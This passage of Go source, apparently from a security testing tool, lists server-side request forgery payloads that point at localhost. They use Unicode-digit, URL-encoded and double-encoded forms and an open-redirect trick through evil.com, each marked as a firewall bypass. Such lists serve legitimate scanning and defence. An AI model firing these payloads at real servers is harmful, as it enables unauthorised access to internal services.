	{Value: "http://①②⑦.⓪.⓪.①", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Unicode IP", WAFBypass: true},

	// Double URL encoding
	{Value: "http://%31%32%37%2e%30%2e%30%2e%31", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "URL encoded localhost", WAFBypass: true},
	{Value: "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Double URL encoded", WAFBypass: true},

	// Redirect-based
	{Value: "http://evil.com/redirect?url=http://127.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Open redirect bypass", WAFBypass: true},
}
